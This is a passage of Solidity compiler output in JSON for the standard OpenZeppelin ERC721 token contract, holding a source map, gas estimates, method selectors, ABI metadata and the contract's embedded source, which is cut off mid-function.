15744:17;15737:47;15801:131;15927:4;15801:131;:::i;:::-;15793:139;;15520:419;;;:::o;15945:::-;16111:4;16149:2;16138:9;16134:18;16126:26;;16198:9;16192:4;16188:20;16184:1;16173:9;16169:17;16162:47;16226:131;16352:4;16226:131;:::i;:::-;16218:139;;15945:419;;;:::o;16370:222::-;16463:4;16501:2;16490:9;16486:18;16478:26;;16514:71;16582:1;16571:9;16567:17;16558:6;16514:71;:::i;:::-;16370:222;;;;:::o;16598:129::-;16632:6;16659:20;;:::i;:::-;16649:30;;16688:33;16716:4;16708:6;16688:33;:::i;:::-;16598:129;;;:::o;16733:75::-;16766:6;16799:2;16793:9;16783:19;;16733:75;:::o;16814:307::-;16875:4;16965:18;16957:6;16954:30;16951:56;;;16987:18;;:::i;:::-;16951:56;17025:29;17047:6;17025:29;:::i;:::-;17017:37;;17109:4;17103;17099:15;17091:23;;16814:307;;;:::o;17127:98::-;17178:6;17212:5;17206:12;17196:22;;17127:98;;;:::o;17231:99::-;17283:6;17317:5;17311:12;17301:22;;17231:99;;;:::o;17336:168::-;17419:11;17453:6;17448:3;17441:19;17493:4;17488:3;17484:14;17469:29;;17336:168;;;;:::o;17510:169::-;17594:11;17628:6;17623:3;17616:19;17668:4;17663:3;17659:14;17644:29;;17510:169;;;;:::o;17685:148::-;17787:11;17824:3;17809:18;;17685:148;;;;:::o;17839:305::-;17879:3;17898:20;17916:1;17898:20;:::i;:::-;17893:25;;17932:20;17950:1;17932:20;:::i;:::-;17927:25;;18086:1;18018:66;18014:74;18011:1;18008:81;18005:107;;;18092:18;;:::i;:::-;18005:107;18136:1;18133;18129:9;18122:16;;17839:305;;;;:::o;18150:191::-;18190:4;18210:20;18228:1;18210:20;:::i;:::-;18205:25;;18244:20;18262:1;18244:20;:::i;:::-;18239:25;;18283:1;18280;18277:8;18274:34;;;18288:18;;:::i;:::-;18274:34;18333:1;18330;18326:9;18318:17;;18150:191;;;;:::o;18347:96::-;18384:7;18413:24;18431:5;18413:24;:::i;:::-;18402:35;;18347:96;;;:::o;18449:90::-;18483:7;18526:5;18519:13;18512:21;18501:32;;18449:90;;;:::o;18545:149::-;18581:7;18621:66;18614:5;18610:78;18599:89;;18545:149;;;:::o;18700:126::-;18737:7;18777:42;18770:5;18766:54;18755:65;;18700:126;;;:::o;18832:77::-;18869:7;18898:5;18887:16;;18832:77;;;:::o;18915:154::-;18999:6;18994:3;18989;18976:30;19061:1;19052:6;19047:3;19043:16;19036:27;18915:154;;;:::o;19075:307::-;19143:1;19153:113;19167:6;19164:1;19161:13;19153:113;;;19252:1;19247:3;19243:11;19237:18;19233:1;19228:3;19224:11;19217:39;19189:2;19186:1;19182:10;19177:15;;19153:113;;;19284:6;19281:1;19278:13;19275:101;;;19364:1;19355:6;19350:3;19346:16;19339:27;19275:101;19124:258;19075:307;;;:::o;19388:320::-;19432:6;19469:1;19463:4;19459:12;19449:22;;19516:1;19510:4;19506:12;19537:18;19527:81;;19593:4;19585:6;19581:17;19571:27;;19527:81;19655:2;19647:6;19644:14;19624:18;19621:38;19618:84;;;19674:18;;:::i;:::-;19618:84;19439:269;19388:320;;;:::o;19714:281::-;19797:27;19819:4;19797:27;:::i;:::-;19789:6;19785:40;19927:6;19915:10;19912:22;19891:18;19879:10;19876:34;19873:62;19870:88;;;19938:18;;:::i;:::-;19870:88;19978:10;19974:2;19967:22;19757:238;19714:281;;:::o;20001:180::-;20049:77;20046:1;20039:88;20146:4;20143:1;20136:15;20170:4;20167:1;20160:15;20187:180;20235:77;20232:1;20225:88;20332:4;20329:1;20322:15;20356:4;20353:1;20346:15;20373:180;20421:77;20418:1;20411:88;20518:4;20515:1;20508:15;20542:4;20539:1;20532:15;20559:180;20607:77;20604:1;20597:88;20704:4;20701:1;20694:15;20728:4;20725:1;20718:15;20745:117;20854:1;20851;20844:12;20868:117;20977:1;20974;20967:12;20991:117;21100:1;21097;21090:12;21114:117;21223:1;21220;21213:12;21237:102;21278:6;21329:2;21325:7;21320:2;21313:5;21309:14;21305:28;21295:38;;21237:102;;;:::o;21345:232::-;21485:34;21481:1;21473:6;21469:14;21462:58;21554:15;21549:2;21541:6;21537:15;21530:40;21345:232;:::o;21583:237::-;21723:34;21719:1;21711:6;21707:14;21700:58;21792:20;21787:2;21779:6;21775:15;21768:45;21583:237;:::o;21826:224::-;21966:34;21962:1;21954:6;21950:14;21943:58;22035:7;22030:2;22022:6;22018:15;22011:32;21826:224;:::o;22056:223::-;22196:34;22192:1;22184:6;22180:14;22173:58;22265:6;22260:2;22252:6;22248:15;22241:31;22056:223;:::o;22285:175::-;22425:27;22421:1;22413:6;22409:14;22402:51;22285:175;:::o;22466:228::-;22606:34;22602:1;22594:6;22590:14;22583:58;22675:11;22670:2;22662:6;22658:15;22651:36;22466:228;:::o;22700:174::-;22840:26;22836:1;22828:6;22824:14;22817:50;22700:174;:::o;22880:220::-;23020:34;23016:1;23008:6;23004:14;22997:58;23089:3;23084:2;23076:6;23072:15;23065:28;22880:220;:::o;23106:248::-;23246:34;23242:1;23234:6;23230:14;23223:58;23315:31;23310:2;23302:6;23298:15;23291:56;23106:248;:::o;23360:122::-;23433:24;23451:5;23433:24;:::i;:::-;23426:5;23423:35;23413:63;;23472:1;23469;23462:12;23413:63;23360:122;:::o;23488:116::-;23558:21;23573:5;23558:21;:::i;:::-;23551:5;23548:32;23538:60;;23594:1;23591;23584:12;23538:60;23488:116;:::o;23610:120::-;23682:23;23699:5;23682:23;:::i;:::-;23675:5;23672:34;23662:62;;23720:1;23717;23710:12;23662:62;23610:120;:::o;23736:122::-;23809:24;23827:5;23809:24;:::i;:::-;23802:5;23799:35;23789:63;;23848:1;23845;23838:12;23789:63;23736:122;:::o"},"gasEstimates":{"creation":{"codeDepositCost":"1798800","executionCost":"infinite","totalCost":"infinite"},"external":{"approve(address,uint256)":"infinite","balanceOf(address)":"2924","getApproved(uint256)":"5277","isApprovedForAll(address,address)":"infinite","name()":"infinite","ownerOf(uint256)":"3025","safeTransferFrom(address,address,uint256)":"infinite","safeTransferFrom(address,address,uint256,bytes)":"infinite","setApprovalForAll(address,bool)":"infinite","supportsInterface(bytes4)":"774","symbol()":"infinite","tokenURI(uint256)":"3467","transferFrom(address,address,uint256)":"infinite"},"internal":{"_afterTokenTransfer(address,address,uint256,uint256)":"17","_approve(address,uint256)":"infinite","_baseURI()":"infinite","_beforeTokenTransfer(address,address,uint256,uint256)":"infinite","_burn(uint256)":"infinite","_checkOnERC721Received(address,address,uint256,bytes memory)":"infinite","_exists(uint256)":"2312","_isApprovedOrOwner(address,uint256)":"infinite","_mint(address,uint256)":"infinite","_ownerOf(uint256)":"2248","_requireMinted(uint256)":"infinite","_safeMint(address,uint256)":"infinite","_safeMint(address,uint256,bytes memory)":"infinite","_safeTransfer(address,address,uint256,bytes memory)":"infinite","_setApprovalForAll(address,address,bool)":"infinite","_transfer(address,address,uint256)":"infinite"}},"methodIdentifiers":{"approve(address,uint256)":"095ea7b3","balanceOf(address)":"70a08231","getApproved(uint256)":"081812fc","isApprovedForAll(address,address)":"e985e9c5","name()":"06fdde03","ownerOf(uint256)":"6352211e","safeTransferFrom(address,address,uint256)":"42842e0e","safeTransferFrom(address,address,uint256,bytes)":"b88d4fde","setApprovalForAll(address,bool)":"a22cb465","supportsInterface(bytes4)":"01ffc9a7","symbol()":"95d89b41","tokenURI(uint256)":"c87b56dd","transferFrom(address,address,uint256)":"23b872dd"}},"metadata":"{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"approved\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"name\":\"ApprovalForAll\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"getApproved\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"}],\"name\":\"isApprovedForAll\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"ownerOf\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"safeTransferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"safeTransferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"name\":\"setApprovalForAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes4\",\"name\":\"interfaceId\",\"type\":\"bytes4\"}],\"name\":\"supportsInterface\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"tokenURI\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including the Metadata extension, but not including the Enumerable extension, which is available separately as {ERC721Enumerable}.\",\"kind\":\"dev\",\"methods\":{\"approve(address,uint256)\":{\"details\":\"See {IERC721-approve}.\"},\"balanceOf(address)\":{\"details\":\"See {IERC721-balanceOf}.\"},\"constructor\":{\"details\":\"Initializes the contract by setting a `name` and a `symbol` to the token collection.\"},\"getApproved(uint256)\":{\"details\":\"See {IERC721-getApproved}.\"},\"isApprovedForAll(address,address)\":{\"details\":\"See {IERC721-isApprovedForAll}.\"},\"name()\":{\"details\":\"See {IERC721Metadata-name}.\"},\"ownerOf(uint256)\":{\"details\":\"See {IERC721-ownerOf}.\"},\"safeTransferFrom(address,address,uint256)\":{\"details\":\"See {IERC721-safeTransferFrom}.\"},\"safeTransferFrom(address,address,uint256,bytes)\":{\"details\":\"See {IERC721-safeTransferFrom}.\"},\"setApprovalForAll(address,bool)\":{\"details\":\"See {IERC721-setApprovalForAll}.\"},\"supportsInterface(bytes4)\":{\"details\":\"See {IERC165-supportsInterface}.\"},\"symbol()\":{\"details\":\"See {IERC721Metadata-symbol}.\"},\"tokenURI(uint256)\":{\"details\":\"See {IERC721Metadata-tokenURI}.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"See {IERC721-transferFrom}.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/token/ERC721/ERC721.sol\":\"ERC721\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC721/ERC721.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC721/ERC721.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"./IERC721.sol\\\";\\nimport \\\"./IERC721Receiver.sol\\\";\\nimport \\\"./extensions/IERC721Metadata.sol\\\";\\nimport \\\"../../utils/Address.sol\\\";\\nimport \\\"../../utils/Context.sol\\\";\\nimport \\\"../../utils/Strings.sol\\\";\\nimport \\\"../../utils/introspection/ERC165.sol\\\";\\n\\n/**\\n * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including\\n * the Metadata extension, but not including the Enumerable extension, which is available separately as\\n * {ERC721Enumerable}.\\n */\\ncontract ERC721 is Context, ERC165, IERC721, IERC721Metadata {\\n    using Address for address;\\n    using Strings for uint256;\\n\\n    // Token name\\n    string private _name;\\n\\n    // Token symbol\\n    string private _symbol;\\n\\n    // Mapping from token ID to owner address\\n    mapping(uint256 => address) private _owners;\\n\\n    // Mapping owner address to token count\\n    mapping(address => uint256) private _balances;\\n\\n    // Mapping from token ID to approved address\\n    mapping(uint256 => address) private _tokenApprovals;\\n\\n    // Mapping from owner to operator approvals\\n    mapping(address => mapping(address => bool)) private _operatorApprovals;\\n\\n    /**\\n     * @dev Initializes the contract by setting a `name` and a `symbol` to the token collection.\\n     */\\n    constructor(string memory name_, string memory symbol_) {\\n        _name = name_;\\n        _symbol = symbol_;\\n    }\\n\\n    /**\\n     * @dev See {IERC165-supportsInterface}.\\n     */\\n    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {\\n        return\\n            interfaceId == type(IERC721).interfaceId ||\\n            interfaceId == type(IERC721Metadata).interfaceId ||\\n            super.supportsInterface(interfaceId);\\n    }\\n\\n    /**\\n     * @dev See {IERC721-balanceOf}.\\n     */\\n    function balanceOf(address owner) public view virtual override returns (uint256) {\\n        require(owner != address(0), \\\"ERC721: address zero is not a valid owner\\\");\\n        return _balances[owner];\\n    }\\n\\n    /**\\n     * @dev See {IERC721-ownerOf}.\\n     */\\n    function ownerOf(uint256 tokenId) public view virtual override returns (address) {\\n        address owner = _ownerOf(tokenId);\\n        require(owner != address(0), \\\"ERC721: invalid token ID\\\");\\n        return owner;\\n    }\\n\\n    /**\\n     * @dev See {IERC721Metadata-name}.\\n     */\\n    function name() public view virtual override returns (string memory) {\\n        return _name;\\n    }\\n\\n    /**\\n     * @dev See {IERC721Metadata-symbol}.\\n     */\\n    function symbol() public view virtual override returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    /**\\n     * @dev See {IERC721Metadata-tokenURI}.\\n     */\\n    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {\\n        _requireMinted(tokenId);\\n\\n        string memory baseURI = _baseURI();\\n        return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : \\\"\\\";\\n    }\\n\\n    /**\\n     * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each\\n     * token will be the concatenation of the `baseURI` and the `tokenId`. Empty\\n     * by default, can be overridden in child contracts.\\n     */\\n    function _baseURI() internal view virtual returns (string memory) {\\n        return \\\"\\\";\\n    }\\n\\n    /**\\n     * @dev See {IERC721-approve}.\\n     */\\n    function approve(address to, uint256 tokenId) public virtual override {\\n        address owner = ERC721.ownerOf(tokenId);\\n        require(to != owner, \\\"ERC721: approval to current owner\\\");\\n\\n        require(\\n            _msgSender() == owner || isApprovedForAll(owner, _msgSender()),\\n            \\\"ERC721: approve caller is not token owner or approved for all\\\"\\n        );\\n\\n        _approve(to, tokenId);\\n    }\\n\\n    /**\\n     * @dev See {IERC721-getApproved}.\\n     */\\n    function getApproved(uint256 tokenId) public view virtual override returns (address) {\\n        _requireMinted(tokenId);\\n\\n        return _tokenApprovals[tokenId];\\n    }\\n\\n    /**\\n     * @dev See {IERC721-setApprovalForAll}.\\n     */\\n    function setApprovalForAll(address operator, bool approved) public virtual override {\\n        _setApprovalForAll(_msgSender(), operator, approved);\\n    }\\n\\n    /**\\n     * @dev See {IERC721-isApprovedForAll}.\\n     */\\n    function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {\\n        return _operatorApprovals[owner][operator];\\n    }\\n\\n    /**\\n     * @dev See {IERC721-transferFrom}.\\n     */\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) public virtual override {\\n        //solhint-disable-next-line max-line-length\\n        require(_isApprovedOrOwner(_msgSender(), tokenId), \\\"ERC721: caller is not token owner or approved\\\");\\n\\n        _transfer(from, to, tokenId);\\n    }\\n\\n    /**\\n     * @dev See {IERC721-safeTransferFrom}.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) public virtual override {\\n        safeTransferFrom(from, to, tokenId, \\\"\\\");\\n    }\\n\\n    /**\\n     * @dev See {IERC721-safeTransferFrom}.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId,\\n        bytes memory data\\n    ) public virtual override {\\n        require(_isApprovedOrOwner(_msgSender(), tokenId), \\\"ERC721: caller is not token owner or approved\\\");\\n        _safeTransfer(from, to, tokenId, data);\\n    }\\n\\n    /**\\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\\n     *\\n     * `data` is additional data, it has no specified format and it is sent in call to `to`.\\n     *\\n     * This internal function is equivalent to {safeTransferFrom}, and can be used to e.g.\\n     * implement alternative mechanisms to perform token transfer, such as signature-based.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must exist and be owned by `from`.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _safeTransfer(\\n        address from,\\n        address to,\\n        uint256 tokenId,\\n        bytes memory data\\n    ) internal virtual {\\n        _transfer(from, to, tokenId);\\n        require(_checkOnERC721Received(from, to, tokenId, data), \\\"ERC721: transfer to non ERC721Receiver implementer\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the owner of the `tokenId`. Does NOT revert if token doesn't exist\\n     */\\n    function _ownerOf(uint256 tokenId) internal view virtual returns (address) {\\n        return _owners[tokenId];\\n    }\\n\\n    /**\\n     * @dev Returns whether `tokenId` exists.\\n     *\\n     * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.\\n     *\\n     * Tokens start existing when they are minted (`_mint`),\\n     * and stop existing when they are burned (`_burn`).\\n     */\\n    function _exists(uint256 tokenId) internal view virtual returns (bool) {\\n        return _ownerOf(tokenId) != address(0);\\n    }\\n\\n    /**\\n     * @dev Returns whether `spender` is allowed to manage `tokenId`.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     */\\n    function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) {\\n        address owner = ERC721.ownerOf(tokenId);\\n        return (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);\\n    }\\n\\n    /**\\n     * @dev Safely mints `tokenId` and transfers it to `to`.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must not exist.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _safeMint(address to, uint256 tokenId) internal virtual {\\n        _safeMint(to, tokenId, \\\"\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-ERC721-_safeMint-address-uint256-}[`_safeMint`], with an additional `data` parameter which is\\n     * forwarded in {IERC721Receiver-onERC721Received} to contract recipients.\\n     */\\n    function _safeMint(\\n        address to,\\n        uint256 tokenId,\\n        bytes memory data\\n    ) internal virtual {\\n        _mint(to, tokenId);\\n        require(\\n            _checkOnERC721Received(address(0), to, tokenId, data),\\n            \\\"ERC721: transfer to non ERC721Receiver implementer\\\"\\n        );\\n    }\\n\\n    /**\\n     * @dev Mints `tokenId` and transfers it to `to`.\\n     *\\n     * WARNING: Usage of this method is discouraged, use {_safeMint} whenever possible\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must not exist.\\n     * - `to` cannot be the zero address.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _mint(address to, uint256 tokenId) internal virtual {\\n        require(to != address(0), \\\"ERC721: mint to the zero address\\\");\\n        require(!_exists(tokenId), \\\"ERC721: token already minted\\\");\\n\\n        _beforeTokenTransfer(address(0), to, tokenId, 1);\\n\\n        // Check that tokenId was not minted by `_beforeTokenTransfer` hook\\n        require(!_exists(tokenId), \\\"ERC721: token already minted\\\");\\n\\n        unchecked {\\n            // Will not overflow unless all 2**256 token ids are minted to the same owner.\\n            // Given that tokens are minted one by one, it is impossible in practice that\\n            // this ever happens. Might change if we allow batch minting.\\n            // The ERC fails to describe this case.\\n            _balances[to] += 1;\\n        }\\n\\n        _owners[tokenId] = to;\\n\\n        emit Transfer(address(0), to, tokenId);\\n\\n        _afterTokenTransfer(address(0), to, tokenId, 1);\\n    }\\n\\n    /**\\n     * @dev Destroys `tokenId`.\\n     * The approval is cleared when the token is burned.\\n     * This is an internal function that does not check if the sender is authorized to operate on the token.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _burn(uint256 tokenId) internal virtual {\\n        address owner = ERC721.ownerOf(tokenId);\\n\\n        _beforeTokenTransfer(owner, address(0), tokenId, 1);\\n\\n        // Update ownership in case tokenId was transferred by `_beforeTokenTransfer` hook\\n        owner = ERC721.ownerOf(tokenId);\\n\\n        // Clear approvals\\n        delete _tokenApprovals[tokenId];\\n\\n        unchecked {\\n            // Cannot overflow, as that would require more tokens to be burned/transferred\\n            // out than the owner initially received through minting and transferring in.\\n            _balances[owner] -= 1;\\n        }\\n        delete _owners[tokenId];\\n\\n        emit Transfer(owner, address(0), tokenId);\\n\\n        _afterTokenTransfer(owner, address(0), tokenId, 1);\\n    }\\n\\n    /**\\n     * @dev Transfers `tokenId` from `from` to `to`.\\n     *  As opposed to {transferFrom}, this imposes no restrictions on msg.sender.\\n     *\\n     * Requirements:\\n     *\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must be owned by `from`.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _transfer(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) internal virtual {\\n        require(ERC721.ownerOf(tokenId) == from, \\\"ERC721: transfer from incorrect owner\\\");\\n        require(to != address(0), \\\"ERC721: transfer to the zero address\\\");\\n\\n        _beforeTokenTransfer(from, to, tokenId, 1);\\n\\n        // Check that tokenId was not transferred by `_beforeTokenTransfer` hook\\n        require(ERC721.ownerOf(tokenId) == from, \\\"ERC721: transfer from incorrect owner\\\");\\n\\n        // Clear approvals from the previous owner\\n        delete _tokenApprovals[tokenId];\\n\\n        unchecked {\\n            // `_balances[from]` cannot overflow for the same reason as described in `_burn`:\\n            // `from`'s balance is the number of token held, which is at least one before the current\\n            // transfer.\\n            // `_balances[to]` could overflow in the conditions described in `_mint`. That would require\\n            // all 2**256 token ids to be minted, which in practice is impossible.\\n            _balances[from] -= 1;\\n            _balances[to] += 1;\\n        }\\n        _owners[tokenId] = to;\\n\\n        emit Transfer(from, to, tokenId);\\n\\n        _afterTokenTransfer(from, to, tokenId, 1);\\n    }\\n\\n    /**\\n     * @dev Approve `to` to operate on `tokenId`\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function _approve(address to, uint256 tokenId) internal virtual {\\n        _tokenApprovals[tokenId] = to;\\n        emit Approval(ERC721.ownerOf(tokenId), to, tokenId);\\n    }\\n\\n    /**\\n     * @dev Approve `operator` to operate on all of `owner` tokens\\n     *\\n     * Emits an {ApprovalForAll} event.\\n     */\\n    function _setApprovalForAll(\\n        address owner,\\n        address operator,\\n        bool approved\\n    ) internal virtual {\\n        require(owner != operator, \\\"ERC721: approve to caller\\\");\\n        _operatorApprovals[owner][operator] = approved;\\n        emit ApprovalForAll(owner, operator, approved);\\n    }\\n\\n    /**\\n     * @dev Reverts if the `tokenId` has not been minted yet.\\n     */\\n    function _requireMinted(uint256 tokenId) internal view virtual {\\n        require(_exists(tokenId), \\\"ERC721: invalid token ID\\\");\\n    }\\n\\n    /**\\n     * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.\\n     * The call is not executed if the target address is not a contract.\\n     *\\n     * @param from address representing the previous owner of the given token ID\\n     * @param to target address that will receive the tokens\\n     * @param tokenId uint256 ID of the token to be transferred\\n     * @param data bytes optional data to send along with the call\\n     * @return bool whether the call correctly returned the expected magic value\\n     */\\n    function _checkOnERC721Received(\\n        address from,\\n        address to,\\n        uint256 tokenId,\\n        bytes memory data\\n    ) private returns (bool) {\\n        if (to.isContract()) {\\n            try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) {\\n                return retval == IERC721Receiver.onERC721Received.selector;\\n            } catch (bytes memory reason) {\\n                if (reason.length == 0) {\\n                    revert(\\\"ERC721: transfer to non ERC721Receiver implementer\\\");\\n                } else {\\n                    /// @solidity memory-safe-assembly\\n                    assembly {\\n                        revert(add(32, reason), mload(reason))\\n                    }\\n                }\\n            }\\n        } else {\\n            return true;\\n        }\\n    }\\n\\n    /**\\n     * @dev Hook that is called before any token transfer. This includes minting and burning. If {ERC721Consecutive} is\\n     * used, the hook may be called as part of a consecutive (batch) mint, as indicated by `batchSize` greater than 1.\\n     *\\n     * Calling conditions:\\n     *\\n     * - When `from` and `to` are both non-zero, ``from``'s tokens will be transferred to `to`.\\n     * - When `from` is zero, the tokens will be minted for `to`.\\n     * - When `to` is zero, ``from``'s tokens will be burned.\\n     * - `from` and `to` are never both zero.\\n     * - `batchSize` is non-zero.\\n     *\\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\\n     */\\n    function _beforeTokenTransfer(\\n        address from,\\n        address to,\\n        uint256, /* firstTokenId */\\n        uint256 batchSize\\n    ) internal virtual {\\n        if (batchSize > 1) {\\n            if (from != address(0)) {\\n                _balances[from] -= batchSize;\\n            }\\n            if (to != address(0)) {\\n                _balances[to] += batchSize;\\n            }\\n        }\\n    }\\n\\n    /**\\n     * @dev Hook that is called after any token transfer. This includes minting and burning. If {ERC721Consecutive} is\\n     * used, the hook may be called as part of a consecutive (batch) mint, as indicated by `batchSize` greater than 1.\\n     *\\n     * Calling conditions:\\n     *\\n     * - When `from` and `to` are both non-zero, ``from``'s tokens were transferred to `to`.\\n     * - When `from` is zero, the tokens were minted for `to`.\\n     * - When `to` is zero, ``from``'s tokens were burned.\\n     * - `from` and `to` are never both zero.\\n     * - `batchSize` is non-zero.\\n     *\\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\\n     */\\n    function _afterTokenTransfer(\\n        address from,\\n        address to,\\n        uint256 firstTokenId,\\n        uint256 batchSize\\n    ) internal virtual 